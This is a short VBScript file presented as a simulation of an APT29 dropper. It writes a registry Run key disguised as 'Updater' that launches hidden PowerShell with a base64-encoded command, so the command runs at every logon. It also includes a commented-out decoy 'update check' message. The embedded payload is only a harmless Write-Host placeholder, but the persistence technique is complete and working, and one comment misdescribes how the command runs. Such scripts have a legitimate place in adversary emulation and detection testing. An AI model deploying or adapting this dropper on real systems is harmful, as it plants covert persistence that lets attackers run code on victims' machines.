' This script simulates a dropper used by APT29 (Cozy Bear)
' It writes a fake PowerShell payload to the registry for persistence.

Dim oShell, oStream, sPayload, sRegKey

' Create necessary objects
Set oShell = CreateObject("WScript.Shell")
Set oStream = CreateObject("ADODB.Stream")

' Define the registry key path
sRegKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater"

' Base64 encoded "payload" - in a real attack this would be malicious PowerShell
' This is just a placeholder: "Write-Host 'Payload Executed'"
sPayload = "VwByAGkAdABlAC0ASABvAHMAdAAgACgAJwBQAGEAeQBsAG8AYQBkACAARQB4AGUAYwB1AHQAZQBkACcAKQ=="

' Construct the command to be written to the registry
' This uses powershell.exe to decode and execute the payload via IEX (Invoke-Expression)
Dim sCommand
sCommand = "powershell.exe -nop -w hidden -e " & sPayload

' Write the malicious command to the Run key for persistence
oShell.RegWrite sRegKey, sCommand, "REG_SZ"

' Clean up objects
Set oShell = Nothing
Set oStream = Nothing

' Optional: Display a benign message to the user
' WScript.Echo "System update check complete."

